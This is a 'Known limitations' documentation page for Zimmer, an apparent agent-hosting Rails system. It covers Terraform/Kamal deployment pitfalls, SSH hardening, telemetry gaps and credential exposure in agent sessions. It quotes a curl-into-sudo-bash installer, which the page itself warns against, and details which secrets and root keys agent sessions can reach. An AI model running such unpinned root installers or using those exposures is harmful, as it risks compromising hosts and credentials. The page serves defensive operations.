---
title: Known limitations
description: Every bug, quirk, brittle assumption, and open question found by reading the code. This page is meant to be read, not skipped.
sidebar:
  order: 1
---

This page aggregates every known bug, quirk, and brittle assumption in Zimmer, derived by reading the
code rather than the old docs, which were themselves often wrong.

Every item names a file so you can verify it. Nothing is left out for looking bad. Items whose first
line starts with 🔴 would bite a new operator immediately.

Nearly every item below links to the issue tracking it. The few that don't are deliberate — a
platform limit or a design choice we don't intend to change (Push notifications without the Push
API; `RAILS_MASTER_KEY` staying optional on staging, below) — and each says so in place.

---

## Deployment

The deploy is Kamal onto a persistent, Tailscale-only droplet: Terraform bootstraps the box (Docker,
Tailscale, Caddy, the deploy key), and Kamal owns the app stack — a `web` role and a `worker` role
running `bundle exec good_job start`, with durable named volumes for clones and credentials. The
items below are the sharp edges that survived that migration.

### `user_data` is frozen, so the deploy key and the Caddyfile can't be updated in place

The droplet carries `lifecycle { ignore_changes = [user_data] }` — that is what stops app changes from
force-replacing it. The cost: the Kamal deploy public key and the Caddyfile are delivered **only**
through `user_data`, so rotating `KAMAL_SSH_KEY` or changing `var.domain` produces **no plan diff** and
never reaches the box. Both require an explicit `terraform taint digitalocean_droplet.zimmer` — i.e.
deliberately re-creating the droplet, which is exactly the churn this model exists to avoid.

Rotating the deploy key is rare; changing the domain is rarer. But neither is a no-op.

Tracked in [#121](https://github.com/tadasant/zimmer/issues/121).

### A deployment that configures no git identity still cannot commit

`GitIdentityProvisioner` writes `user.name` / `user.email` into `~/.gitconfig` at boot from
`ZIMMER_GIT_USER_NAME` / `ZIMMER_GIT_USER_EMAIL` ([provisioning](/operate/provisioning/#the-git-identity-an-agent-session-commits-with)).
Set neither, or only one, and it writes nothing: a session in that deployment still meets
`Author identity unknown` on its first commit, exactly as it did before that class existed.

**No issue tracks this, deliberately** — it is a design choice, not a defect awaiting a fix.

That is the deliberate half of the fix, not an oversight. The alternative is a default identity baked
into the repo, which would put Zimmer's guess — `Zimmer Agent <zimmer@localhost>` — into a
self-hoster's git history, silently and irreversibly. A missing identity fails loudly at commit time
and the session can recover; a wrong one is in the history forever. So the failure mode is preserved
on purpose for a deployment that has not said who it is, and the boot log says so in one line naming
both variables.

### Terraform cannot give the DigitalOcean metrics agent to a droplet that already exists

`digitalocean_droplet.zimmer` sets `monitoring = var.monitoring`, which defaults to `true`, so a
droplet this module creates is meant to boot with DigitalOcean's metrics agent — CPU, memory, disk
and load history, and the only metrics DO's own resource alert policies can evaluate. It is free.

It is also **create-time only**. `monitoring` is `ForceNew` in the provider (the schema flag, in
every 2.x release including the `~> 2.43` pin; the Update function has no `monitoring` branch), and
DigitalOcean's API exposes no droplet action to enable it — the `droplet_action.type` enum runs
`enable_backups` through `snapshot` with nothing for monitoring, and `godo`, the client the provider
itself uses, has no method for it. So on a droplet that already exists, asking for the agent is a
*destroy and recreate*. Both environments apply with `-auto-approve`, and the production apply owns
the box every Zimmer session runs on. `monitoring` therefore sits in `ignore_changes` alongside
`user_data`, which suppresses that diff and the replacement with it.

**The production droplet predates `monitoring`, so it has no agent** until a deploy-time converge
step installs one. That step belongs in the private companion repository's production deploy, where
the production droplet is applied, and [#651](https://github.com/tadasant/zimmer/issues/651) tracks
it. Until it runs, this is a departure from the rule that
[ops actions ship with the deploy](/operate/deploying/#ops-actions-ship-with-the-deploy).
DigitalOcean's own remedy is `curl -sSL https://repos.insights.digitalocean.com/install.sh | sudo
bash` in a root shell, which a deploy nobody approves by hand must not run. The converge step must:

- **Guard on the unit.** When `do-agent` is installed, enabled and active, do nothing and touch no
  network. Install only when it is absent.
- **Fail loudly, but after the cutover.** A converge that does not end with the unit `active` turns
  the deploy run red, because a silent miss looks converged and reports nothing. It does not block
  the release: a metrics agent that will not stay up must never stop a deploy or a rollback.
- **Pin the content, not only the publisher.** Install one package checked against a pinned
  SHA-256 before apt sees it. A signing key pinned by fingerprint is not enough. It pins who may
  publish, not what gets installed, and the package's own `/etc/cron.daily/do-agent` job upgrades
  it as root from DigitalOcean's repository wherever that repository is configured. Never pipe an
  unpinned installer into root.
- **Use access the deploy already holds.** cloud-init authorizes the deploy key for `root`, and both
  deploys already run their other converge steps as `root` over SSH.

**Staging has no converge step, and needs none.** Its one long-lived droplet also predated
`monitoring`; `Teardown staging` destroyed it on an idle night, so no staging droplet in state
predates the attribute, and `Deploy staging` creates each new one through this module with
`staging.tfvars.example` leaving `monitoring` at its default. An install branch there would never
run, and a root install step that has never run does not belong in an auto-approved deploy.
`test/infra/droplet_monitoring_test.rb` fails the build if staging starts turning `monitoring` off.

Two things here have **never been runtime-verified**:

- **That a droplet this module creates comes up with the agent.** Every droplet the module managed
  when `monitoring` landed predated it, so the next droplet `Deploy staging` creates is the first
  one to show it. The Graphs tab for that droplet in DO's console is the check. If it shows no agent
  metrics, staging needs a converge step after all.
- **Whether an agent installed after creation makes the API list `monitoring` in the droplet's
  `features[]`**, which is where the provider reads the attribute back from. If it does, the next
  refresh records `monitoring = true` and state matches config. If it does not, a converged droplet
  stays `monitoring = false` in state for good. That is harmless under `ignore_changes`, but state is
  then not where to check whether a droplet has the agent. The first converge against production
  settles it.

`ignore_changes` also means Terraform will not turn the agent back off, or back on if someone
disables it — both cheaper than a replace. Adjacent, and different: `var.node_exporter_enabled` puts
a `node_exporter` in cloud-init for an external monitoring plane. That is a different agent feeding
a different consumer, and it inherits the same create-time-only limit,
[below](#node_exporter-is-opt-in-and-reaches-only-a-rebuilt-droplet).

The DO agent reports host metrics. App telemetry goes to the self-hosted OTLP stack — see
[Observability](/operate/observability/).

### `node_exporter` is opt-in, and reaches only a rebuilt droplet

`var.node_exporter_enabled` (default `false`) makes cloud-init install a pinned Prometheus
`node_exporter` as a systemd unit, bound to the droplet's tailnet address on `:9100`. It is the host
telemetry a self-hosted monitoring plane can scrape, in the conventional `node_*` metric names, for a
deployment that wants more than DigitalOcean's console shows.

It is **create-time only**, for the same reason [the deploy key and the Caddyfile
are](#user_data-is-frozen-so-the-deploy-key-and-the-caddyfile-cant-be-updated-in-place): it rides
`user_data`, which is under `ignore_changes`. Set it to `true` against a running droplet and
`terraform plan` reports no change at all — no error, no warning, and no exporter. What applies it is a
droplet rebuild (`recreate_droplet: true` on the staging deploy, or `terraform taint
digitalocean_droplet.zimmer`), or installing the binary and the unit on the live box by hand over
Tailscale SSH — which on production is the access [no agent session
has](#an-agent-sessions-ssh-key-is-root-on-every-host-it-can-reach-and-no-session-is-scoped).

Three consequences worth stating. **The scraper has to be on the tailnet**: the bind is a single
100.x address, and the DigitalOcean firewall opens no public TCP, so there is no route to `:9100` from
anywhere else — by design, and it is why enabling this needs no firewall change. The version is
**pinned** in `cloud-init.yaml.tftpl` with its checksum, because node_exporter reshapes collectors
between minor releases and that moves metric cardinality under whatever is scraping it; bumping it
means editing both, and then rebuilding a droplet to deliver it.

And **`:9100` has no TLS and no authentication**, so *every* tailnet peer the ACLs let reach this node
can read host telemetry and the box's mount and interface topology from it — including, on the
production droplet, the agent sessions that run on it. That is the same trust boundary the app itself
sits behind, so it is a reasonable trade rather than a new hole; but the control is the
[Tailscale ACL](/operate/provisioning/#tailscale-acls), not this module, which adds no firewall rule
and no auth of its own.

**The install path has not been exercised on a real droplet.** Rendering it is verified — the template
is parsed as YAML both ways in CI, the pinned binary was downloaded, checksum-verified and run, and
the wrapper was executed to confirm it binds one interface address and nothing else. What has not
happened is a droplet boot with the flag on, because that needs a rebuild: on production, the box
every session runs on; on staging, one of [five weekly Let's Encrypt
issuances](#rebuilding-staging-costs-a-lets-encrypt-issuance-and-there-are-only-five-a-week). So the
first real exercise of this path is whenever a droplet is next rebuilt with it enabled, and that is
the moment to check `systemctl status node_exporter` rather than assume.

### RAILS_MASTER_KEY is optional on staging, and silently degrades when absent

Staging *can* read encrypted credentials: `config/credentials/staging.yml.enc` is committed, and
`deploy-staging.yml` passes the `STAGING_RAILS_MASTER_KEY` secret through `.kamal/secrets.staging` as
`RAILS_MASTER_KEY`. What remains sharp is what happens without it.

The key is not required, on purpose — failing the deploy would break staging for any fork or
self-hoster that has not set the secret. And it cannot fail loudly at runtime either: ActiveSupport
reads the key as `ENV["RAILS_MASTER_KEY"].presence` (`active_support/encrypted_file.rb`), so blank and
unset are the same thing, `secrets_loader.rb` rescues the miss, and there is no `require_master_key`.
The app boots, healthy, serving **no** `mcp_secrets` — Slack triggers go quiet, and any MCP server
with a `${VAR}` placeholder fails at session start. `deploy-staging.yml` emits a
`::warning::` when the secret is empty, which is the only signal you get.

Production is unaffected: its `.enc` is bind-mounted onto the droplet rather than committed, and
`PROD_RAILS_MASTER_KEY` is mandatory in practice.

Alerting is not part of the flip side: staging's monitors report through the obs pipeline, whose
staging half reaches no Slack channel at all — `SENTRY_DSN_BACKEND` points at the
`zimmer-backend-staging` GlitchTip project, which has no recipient, and the Grafana rule on Zimmer's
error logs subtracts staging from the environments it counts. What `staging.yml.enc` still holds is
the alert channel's **id**, which Zimmer reads only to recognize that channel, never to post to it.

### The release build's retry masks a flake

`release-image.yml` builds the app image up to three times before giving up, because an account-wide
GHCR secondary rate limit intermittently breaks both the `zimmer-base` pull on the way in and the
`zimmer` push on the way out (see
[Deploying](/operate/deploying/#the-release-build-retries-ghcr-on-the-way-in-and-on-the-way-out)).
That is the right trade for a registry hiccup, but it is still a **blind** retry: it does not read the
error, so it cannot tell a throttled push from a genuinely rejected one, and it buys its quiet by
making real breakage slower to surface — 330 seconds of backoff plus three builds before it goes red,
with `concurrency: release-image` queueing the next push behind all of it. (The builds themselves are
not as expensive as that sounds: every attempt runs on the same long-lived buildkit instance, so a
retry resumes from its local cache. A push-side retry re-does little more than the export; only an
early pull-side failure costs close to a full rebuild.)

Blindness is the deliberate half of that trade — the same throttle has already appeared as a 403 on a
base blob, a 404 on a base manifest, and a 403 on a push HEAD, so matching error strings would miss
the fourth shape. What it costs is precision: a build broken for an ordinary reason still burns the
full retry budget before going red. `.github/scripts/await-ghcr.sh` softens that by reading a manifest
from both the base and app packages between attempts and annotating which was refused — but the
annotation only *reports*, nothing acts on it, and because both probes are reads they cannot clear a
write-side throttle even when both come back green.

The blindness extends to two more of the registry steps in the job — three of the four points it
touches GHCR are retried, and `Build & push base image` is the one that is not. `Log in to GHCR` runs `.github/scripts/ghcr-login.sh` — the same `docker login` a
`docker/login-action` step would run, three times, backing off 90s then 240s — because a single-shot
login is a single point of failure in front of everything else: on 2026-09-02 one
`net/http: TLS handshake timeout` reaching `ghcr.io/token` failed the release 48 seconds in and
skipped every step after it. And `Resolve base image` retries its `imagetools inspect` three times,
5s then 15s apart, because that read fails *closed* into `need_base=true` — a hiccup there does not
fail the job, it escalates into a full base rebuild and push against a registry that may already be
refusing the account.

Neither retry is free of the same objection. The login now takes up to 5.5 minutes of backoff to
report a token that is genuinely wrong, and the base resolve pays 20 seconds of waiting on every
legitimate base bump, since a base declaration that really did change is absent and so exhausts the
retries every time. `Build & push base image` itself is still single-shot: a throttle that survives
the resolve's retries and then kills the base build fails the job before the app build's first
attempt is reached. That path has not been observed failing; all the real incidents were the app
build and the login.

### Telemetry is a hard no-op when misconfigured, and says nothing

`config/initializers/otel_logs_exporter.rb` needs **both** `OTEL_LOGS_EXPORTER_ENDPOINT` and
`OTEL_LOGS_EXPORTER_BEARER_TOKEN`; `config/initializers/sentry.rb` needs `SENTRY_DSN_BACKEND`. Any of
them missing and the initializer does nothing at all — no raise, no warning, a perfectly healthy boot,
and no data. A deployment can sit in that state indefinitely, and nothing anywhere says so. Staging did
exactly that: every layer of the wiring was in place except the two GitHub Actions secrets, so it shipped
nothing at all, healthily, for as long as anyone cared to look.

The no-op is a reasonable default on a machine that never sets the variables, so the mitigation is
visibility rather than a hard failure. On **staging** that visibility is now enforced: `deploy-staging.yml`
prints an observability preflight, and then — when both secrets are set — runs `bin/rails obs:smoke` in the
deployed container and fails the run if the collector rejects the ingest or the exporter is off anyway.
**Production has no such gate** (it deploys from a separate repo), so there the mitigation is still only
`bin/rails obs:status` / `bin/rails obs:smoke`, run by hand. Absence of data is never, by itself, evidence
of absence of errors.

What the no-op is *not* is an environment guard. Zimmer's agent sessions run inside the production
container, so the production values are present in their environment — and a `RAILS_ENV=test`
process with a production DSN reports to the production error project, which is how a test-env
database error once paged the production Slack channel. Errors are therefore additionally gated on
`Rails.env` being `production` or `staging`
([details](/operate/observability/#only-production-and-staging-may-report)).

### A CSRF failure still ships a context-free WARN, and is still counted per record

`ApplicationController` handles `ActionController::InvalidAuthenticityToken` and re-logs it at
INFO with the verb, path, IP, user agent, failure reason, and whether a session cookie was
present, so the failure no longer emits an ERROR record and no longer pages
([details](/operate/observability/#client-caused-rejections-are-re-logged-at-info-not-suppressed)).
Three edges remain.

**The attributable line is not in VictoriaLogs.** The exporter ships WARN and above, so the INFO
record lands on container stdout and nowhere else. What Grafana still has is the WARN Rails logs
from inside `handle_unverified_request` before any application code runs — and that line names
nothing: no path, no verb, no client. So an on-call who stops at Grafana is back where
[#295](https://github.com/tadasant/zimmer/issues/295) started, and has to read the container to
get the rest. Logging it at WARN instead would put it in Grafana and still page nobody (the
production rule counts ERROR records only); it is at INFO because that is what #295 specified
and what `ErrorsController` already does for 404s. Suppressing the bare WARN is possible only
with `config.action_controller.log_warning_on_csrf_failure = false`, which would also silence it
in development, so it has been left alone.

**The Grafana rule is per-record, not a rate.** One CSRF failure is a stale form or a bot; a
hundred an hour is the app being broken for every writer, which is what
[#19](https://github.com/tadasant/zimmer/issues/19) was. Both look identical to a rule that
counts to one, and re-tuning that rule is an obs-side change living in `tadasant-internal`
(`obs/`), not in this repo. The Sentry pipeline does count a rate: the initializer subtracts
`ActionController::InvalidAuthenticityToken` from sentry-rails' inherited exclusions, and
`CsrfRejectionMonitor` reports one GlitchTip event (plus one WARN) per five-minute bucket once
ten rejections land in it
([details](/operate/observability/#a-rate-of-csrf-rejections-pages-a-single-one-does-not)).
Two edges remain there. The counter is *global*, not per client, so one client repeatedly
posting without a token to real routes can trip it — the report carries `session_cookie` and
`user_agent` so that costs one glance rather than an investigation. And whether a GlitchTip
event actually reaches Slack depends on GlitchTip's alert rules, which live outside this repo
and have not been verified end to end (ask 2 of #23).

**Administrate is not covered by the handler.** `Supervisor::ApplicationController` descends
from `Administrate::ApplicationController`, not from Zimmer's `ApplicationController`, so it
never sees the handler. A tokenless non-GET to any `/supervisor/*` route still raises, still
logs at ERROR, and still pages. Nothing links to those routes from the public UI, so the
realistic trigger is a probe rather than a user. It also reaches GlitchTip, one event per
request, with the URL and user agent the ERROR record lacks. The GoodJob dashboard at `/jobs`
behaves the same way, for the same reason.

### An agent session's shell still carries the OTLP ingest token

`SENTRY_DSN_BACKEND` is scrubbed from agent-session child processes (`CliSpawnEnv`), but
`OTEL_LOGS_EXPORTER_ENDPOINT` and `OTEL_LOGS_EXPORTER_BEARER_TOKEN` are not. Two consequences: the
shared ingest token sits in every agent shell's environment, one `env` away from a transcript; and a
`bin/rails` command an agent runs in a repo clone ships that clone's WARN/ERROR lines to the real obs
stack. Neither pages anyone — the records are stamped `deployment.environment=test`, and production
alert rules scope to `deployment.environment=production` — so this is noise and credential exposure,
not false alerting. Scrubbing them too would stop agent-session log export outright, which is a
bigger decision than it looks; it has not been made.

`ZIMMER_GIT_SHA` is not scrubbed either, so those clone-run records carry a `service.version` that
is true of the **image** and false of the code that emitted them: an agent session works in a clone
at some other commit, and nothing in the record says so. `deployment.environment` is still the thing
that tells them apart from a real deployment's records — read it before reading `service.version`.

### A real bug found from an interactive `rails runner` is not recorded anywhere

`config/initializers/sentry.rb` drops any event tagged `source: runner` when the process has a
controlling terminal, so an operator's console typo stops paging `#alerts`
([#767](https://github.com/tadasant/zimmer/issues/767)). The filter cannot tell a typo from a
genuine app bug an operator happens to trip over at that prompt: both are dropped, and no
GlitchTip issue is opened for either. What survives is a `[sentry] dropped an interactive rails
runner event: <class>` line in the container log — greppable, but nothing alerts on it, and the
exception message is deliberately not included. An operator who wants the event recorded runs
the command without a terminal.

The filter's correctness also rests on an assumption enforced in a **different repository**: that
`tadasant-internal`'s `scripts/verify-job-drain-remote.sh` never allocates a TTY for its two
`bin/rails runner` invocations. It does not today (`docker exec` and `docker exec -i`, both with
output captured), but nothing on that side guards it. Switching to `docker exec -t` for colored
output, or to `docker compose exec` — which allocates a TTY unless given `-T` — would silently
stop the drain gate's exceptions from reporting, with no error in either repo.

### Staging cannot have its own OTLP ingest token

The obs stack's ingest gateway matches the `Authorization` header against a **single** shared token,
so staging authenticates with the same bearer token as production. There is no per-environment ingest
credential, and revoking staging's access means revoking production's. Separation happens *after*
ingest, via the `deployment.environment` resource attribute — which is a labeling boundary, not a
security one.

Errors do get a real boundary: staging and production point at different GlitchTip projects, because a
DSN selects a project and GlitchTip's alert rules are per-project with no environment filter.

### Nothing prevents a staging error from paging production's alert channel

The separation between staging and production telemetry is the `deployment.environment` attribute, and
it only works if the *consumer* honors it. An alert rule that selects on `{service.name="zimmer"}`
alone matches staging records identically to production ones. Zimmer emits the label correctly; it
cannot enforce that the alert rules on the other side filter by it. Those rules live in a separate
repository.

### A clone's `.env` is scoped to its artifacts, which is not the same as scoped to what it can reach

A session clone's `.env` no longer carries the deployment's whole credential bundle. It carries the
secrets that session's own MCP servers, skills and hooks declare — see
[What reaches a session clone's `.env`](/operate/provisioning/#what-reaches-a-session-clones-env) — so a
session provisioned with `grafana` holds `GRAFANA_SERVICE_ACCOUNT_TOKEN` and nothing else, and
`SLACK_BOT_TOKEN` is absent from every clone whose session was not given a Slack server.

Three things that scope does **not** claim:

- **A session that *is* given a Slack server holds a live bot token**, and anything it runs can post,
  edit or delete as the real bot in any channel the bot is in. Least privilege moved the question from
  "every session" to "which sessions", it did not answer it. The answer is
  [the inference that picks a session's servers](/air/mcp-servers/), which is a judgement call, not a
  mechanism.
- **The scope is derived from declarations, not from use.** A catalog entry that reads a credential it
  does not name in `${VAR}` — or a skill that names one without a `$` — is invisible to it. Both fail
  toward writing fewer keys, which is the right direction and still a gap between what an artifact
  needs and what the rule can see.
- **A session can read every other session's clone.** Every clone is `0600`, owned by `rails`, under
  one `~/.zimmer/clones` directory, and every agent process runs as `rails` — so a session with no Slack
  server can still `cat` the `.env` of a sibling that has one. The scope limits what a session is
  *handed*, not what it can *reach*; the same-Unix-user boundary is the one described for elicitation
  tokens below, and closing it needs a per-session user or a filesystem namespace, which Zimmer does
  not have.
- **`CliSpawnEnv`'s denylist is still a denylist.** Everything else in the worker's own environment is
  inherited verbatim by an agent process. Narrowing the `.env` narrows one channel.

What it does close is [#372](https://github.com/tadasant/zimmer/issues/372)'s worked case. An agent's
shell has no `RAILS_ENV`, so a clone that boots Zimmer boots it as `development`; in
[#272](https://github.com/tadasant/zimmer/issues/272) such a clone registered development's cron table,
probed the approval endpoint at `http://localhost:3000` where nothing was listening, and paged the
production `#alerts` channel every five minutes — every throttle that should have capped it at one
message was cache-backed, and the clone could not reach the cache. That needed two things: a Zimmer
that would page, and a token to page with. The first is now a DSN `CliSpawnEnv` strips from every agent
shell ([only the deployed environments may page](/operate/background-jobs/#who-is-allowed-to-page)); the
second is now absent from the clone unless the session was given a Slack server.

### SSH hardening only reaches a droplet that is rebuilt

SSH is now [tailnet-only](/operate/ssh-access/#ssh-is-tailnet-only): the firewall opens no public
TCP port, real OpenSSH listens on a tailnet-only `:2222`, and sshd takes password auth off. But two of
those three land through **cloud-init**, and the droplet carries `ignore_changes = [user_data]` — so
they only reach a box that is *rebuilt*.

The firewall change is the exception and the one that matters most: it is a plain resource, so a
normal `terraform apply` closes public `:22` on the existing droplet immediately. What waits for a
rebuild is the `:2222` listener and the `PasswordAuthentication no` drop-in. Until then a long-lived
droplet keeps whatever sshd posture it booted with — which, on an Ubuntu cloud image, is
**`PermitRootLogin yes` + `PasswordAuthentication yes`** (see below).

Deploy with `recreate_droplet: true` to force the rebuild, or apply the two files by hand and let the
next rebuild converge.

### Neither the sshd config files nor `sshd -T` tell you what sshd is actually doing

Two independent traps, and they stack. Both bit this repo for real.

**The config files lie.** `/etc/ssh/sshd_config.d/60-cloudimg-settings.conf` says
`PasswordAuthentication no`. sshd takes the **first** value it sees for a keyword, and cloud-init
writes `PasswordAuthentication yes` into `50-cloud-init.conf`, which sorts first — so `60`'s `no`
never won, and root password auth was genuinely accepted on both droplets while the file said
otherwise. That is why the hardening drop-in is `10-hardening.conf`: it has to sort *before* `50`.

**`sshd -T` also lies** — it is a fresh *parse* of the config on disk, not a readout of the running
daemon. Ubuntu's `ssh.socket` is `Accept=no`, so it hands its sockets to **one long-lived `sshd -D`**
that parsed its config once, at start. Write a hardening drop-in without restarting `ssh.service` and
`sshd -T` will cheerfully report `passwordauthentication no` while the live daemon keeps taking
passwords. This is exactly what happened when the fix was first applied to production by hand.

The only honest check is what the daemon *advertises on the wire*:

```bash
ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password -p 2222 root@<host>
# key-only  ->  Permission denied (publickey).
# still bad ->  Permission denied (publickey,password).
```

### Production's forced root-password expiry has no converge path

🔴 DigitalOcean force-expires root's password on any droplet created without a DO-registered SSH key —
which is the deliberate posture here — and `pam_unix` then rejects
[every real-OpenSSH session on `:2222`](/operate/ssh-access/#digitalocean-force-expires-roots-password-and-that-rejects-every-openssh-session)
*after* publickey auth succeeds. cloud-init clears it at first boot, and
`scripts/clear-root-password-expiry.sh` repairs a box that already exists — including one whose
password DigitalOcean's **Reset root password** flow has just re-expired.

The staging deploy runs that script on every deploy. **Production's deploy workflow is not in this
repo** (it lives in the private mirror), so nothing converges production. Production's OpenSSH works
today only by accident: its root password happened to be changed at some point, which reset `lastchg`.
Rebuild it and it comes up broken, exactly like staging did.

Run the script by hand from a tailnet host — `scripts/clear-root-password-expiry.sh zimmer` — or add
the step to the mirror's workflow.

Tracked in [#151](https://github.com/tadasant/zimmer/issues/151).

### An agent session's SSH key is root on every host it can reach, and no session is scoped

The [operator SSH key](/operate/provisioning/#the-ssh-identity-an-agent-session-holds) that agent
sessions authenticate with is authorized for `root` — there is no unprivileged SSH user on a Zimmer
box. It opens staging, the observability host, and the CI runner, at full privilege, from any session.

There is **no per-session scoping**. Every session in the worker container inherits the same key, so
"which sessions may SSH where" is not a question Zimmer can answer: they can all go everywhere the key
goes. The only real control is which hosts authorize the key, and that is a per-host decision made
outside the app.

That control is used in exactly one place, and it is the important one: **production does not
authorize the key**. A session runs *on* production, and a session with root on its own host can take
the orchestrator down with itself inside the blast radius. Staging is disposable, so the same key
there is an accepted trade. See [who is authorized where](/operate/ssh-access/#who-is-authorized-where)
— and do not reconcile the two lists.

### Admin keys are add-only

`admin_ssh_pubkeys` appends to `/root/.ssh/authorized_keys` and never prunes. **Removing** a key from
the list does not revoke it from a running droplet — that needs a rebuild or a manual edit. Adding
does not reach a running droplet either (the list rides `user_data`, which cloud-init reads once at
creation), so the variable is really "who gets authorized on the next rebuild", not a live
access-control list. A key can be [appended live over Tailscale
SSH](/operate/ssh-access/#adding-a-key-does-not-touch-a-running-droplet) — which is how production
converges, since it cannot be casually rebuilt — but that is a separate action, not something the
variable does.

### Staging's admin key list is invisible state in an Actions variable

Staging's `admin_ssh_pubkeys` comes from the `ADMIN_SSH_PUBKEYS` repository variable, not from the
committed `staging.tfvars.example` — the file is copied verbatim into every deploy, and this repo is
public, so a key in it would be [authorized for `root` on every fork's
droplet](/operate/ssh-access/#operator-keys). The cost of moving it is that the list now lives
somewhere no diff shows: a repository setting, editable by anyone with admin, reviewed by nobody.

Unset — or set to `[]` — it falls through to an empty list, and that failure is silent in the
direction that matters. The deploy still succeeds (Kamal carries its own key), health checks still
pass, and the box is still reachable over Tailscale SSH on `:22` — only the publickey door on `:2222`
is gone, which nothing exercises until an `ssh-*` MCP server inside a session fails to attach. And
because the list rides cloud-init, an unset variable only bites on the rebuild that consumed it, long
after it was unset.

The deploy prints the effective list — key count and each key's comment — on every run, and warns
when it is empty, more loudly when `recreate_droplet` is on. That makes it a line in the log rather
than a discovery, but it is still a log nobody reads on a green deploy.

### A rebuilt droplet has exactly one fallback door, and it is the DigitalOcean console

The firewall now permits **zero public TCP**. On a `recreate_droplet` rebuild, if `tailscale up` fails
— an expired or exhausted auth key is the likely way, and the key is frozen into `user_data` at first
boot — then there is no tailnet, so no Tailscale SSH; `:2222` is unreachable from outside the tailnet;
there is no public `:22`; and Kamal cannot reach the box either. `runcmd` has no `set -e`, so the boot
completes "successfully" regardless.

Before setting `recreate_droplet: true`, confirm (a) `TAILSCALE_AUTH_KEY` is valid and not exhausted,
and (b) you can actually log into the DigitalOcean web console for the droplet.

That console door has a catch. cloud-init deletes root's password (`usermod -p '*'`) — it must, or
[pam_unix rejects every OpenSSH session](/operate/ssh-access/#digitalocean-force-expires-roots-password-and-that-rejects-every-openssh-session) —
so there is no password to type at a console login prompt. Getting one means DigitalOcean's **Reset
root password**, which mails a new one *and* force-expires it again (`lastchg=0`). So the reset that
buys you a console also re-breaks `:2222` until the next staging deploy converges it, or until
`scripts/clear-root-password-expiry.sh` is run against the box.

### A node can report Online while every connection to it times out

`tailscale status` and the Tailscale API both answer from the **control plane**: `Online`,
`connectedToControl` and `lastSeen` say the node is holding its control connection, not that a packet
can reach it. Those are different things, and they come apart under load. A host thrashing on memory
starves `tailscaled` of the CPU it needs to service the data path, so every connection — `:22`, `:2222`,
HTTP over the tailnet — times out with no TCP handshake at all, for minutes at a stretch, while the
control connection (long-lived, cheap, already established) keeps reporting the node perfectly healthy.

The failure looks like a network fault and is actually a capacity fault. Two things mislead you:

- **`Connection timed out`, not `refused`.** Nothing is rejecting the connection, so it reads like a
  firewall or a routing problem. It is neither.
- **Every control-plane check passes.** The deploy's `Prepare Kamal SSH + resolve host` step gates on
  `.Online==true` from `tailscale status --json`, so it resolves the host successfully and the *next*
  step fails to reach it seconds later. The Tailscale API agrees throughout, reporting
  `connectedToControl: true` with a current `lastSeen`.

`scripts/clear-root-password-expiry.sh` distinguishes the two cases and says which one it hit, because
its advice differs: an unreachable host is not a broken password, so there is nothing to repair by
hand. When you see that message, look at the host's memory and load — start with `dmesg -T | grep -i
"killed process"` — rather than at its SSH configuration. Note that the outage clears on its own in a
few minutes, so `:22` answering by the time you investigate does not mean the deploy failed spuriously.

Tracked in [#469](https://github.com/tadasant/zimmer/issues/469).

### 🔴 The database's connection ceiling is a plan property, and Terraform will not raise it for you

Zimmer's connection promise is derived and checked ([the connection
budget](/operate/deploying/#the-database-connection-budget)), but the *other* half — the number of
slots the cluster actually has — is fixed by the DigitalOcean plan slug, and Terraform holds the
production cluster as a data source on purpose, so it has no resize path. All Terraform can do is
refuse to plan against a cluster that is too small, which is what its `lifecycle.postcondition` does.

The order of operations is therefore: **resize the cluster first, deploy second.** A cluster that
cannot serve the budget fails `terraform apply` with the `doctl databases resize` command in the error
message. Promoting the cluster to a managed resource (with `prevent_destroy` and a one-time
`terraform import`) would let Terraform do the resize itself, at the cost of giving it a destroy path
over the one irreplaceable resource in the system. That trade has not been made.

### PgBouncer is not an option here, whatever the connection math says

The reflex for connection exhaustion is a transaction-mode pooler, and DigitalOcean ships one. It does
not work for Zimmer, for two independent reasons:

- **GoodJob forbids it.** Its README is explicit: *"GoodJob is not compatible with PgBouncer in
  transaction mode"* — it uses connection-based advisory locks and `LISTEN`/`NOTIFY`, both of which
  need a full session. The escape hatch (`lock_strategy = :skiplocked` plus
  `enable_listen_notify = false` plus `advisory_lock_heartbeat = false`) is marked experimental and
  trades away the dead-worker detection that reclaims a Zimmer agent session whose worker died.
- **It would not create headroom anyway.** A DigitalOcean pool's backend connections are allotted *out
  of* the cluster's `max_connections`, not on top of it. Pooling the `web` role — the one role whose
  connections are short-lived enough to multiplex — would save a handful of slots on a process that
  only wants eight.

Session-mode pooling maps clients 1:1 onto backends, so it buys nothing at all. The lever is the plan.

### Terraform's connection check sees the repo, not the container

`app_required_backends` in `infra/terraform/main.tf` is a literal, kept equal to
`ConnectionBudget.required_backends` by a test — so changing the app's **defaults** moves the guard
with them. Changing them through the **environment** does not: raise `GOOD_JOB_AGENTS_THREADS` or
`DB_POOL` in `config/deploy.production.yml` and the app's real promise grows while Terraform keeps
validating the old number and passes.

Nothing sets those variables today, so the shipped numbers are correct. The check that *does* see the
running configuration is `bin/rails db:connection_budget` — it reads the actual process env and the
actual server, and exits non-zero when they don't fit. Run it in the container, not on your laptop.

### A saturated `cable` pool would degrade silently

`BroadcastService` rescues every broadcast failure and deliberately does not re-raise — a failed Turbo
Stream must not kill the agent job that emitted it (`BroadcastService#broadcast_with_retry`), and a
circuit breaker opens after five failures. Since
[#524](https://github.com/tadasant/zimmer/issues/524) that covers *every* broadcast in the app,
model-side callbacks included, so there is nowhere left that a dropped cable write surfaces as an
exception. That is the right call for the job, but it means the
`cable` pool is the one pool whose exhaustion produces no error: the symptom is UI updates that stop
arriving while the session itself runs fine. The UI at least admits it now — an open breaker lights
the "Live updates paused" banner (see
[Background jobs](/operate/background-jobs/#the-circuit-breaker-on-the-ui)) — but the banner reports
the breaker, not the pool, so diagnosing *why* still means reading the logs.

The pool is sized at 3 because `solid_cable` leases per `INSERT` and returns the connection, and only
~2% of broadcasts also run an autotrim transaction (`SolidCable::TrimJob`, a SKIP-LOCKED delete of ≤100
rows) — so saturating it would take thousands of broadcasts per second, and twelve agent sessions
produce single or double digits. If that estimate is ever wrong, the failure will be quiet. Raise
`CABLE_DB_POOL` and `app_required_backends` together.

### The database retry helpers hold a thread longer when the pool is full

`DatabaseRetry` (`app/jobs/concerns/database_retry.rb`) and `ControllerDatabaseRetry`
(`app/controllers/concerns/controller_database_retry.rb`) retry `PG::ConnectionBad`,
`PG::UnableToSend`, `ActiveRecord::ConnectionNotEstablished`, `ActiveRecord::ConnectionFailed` and
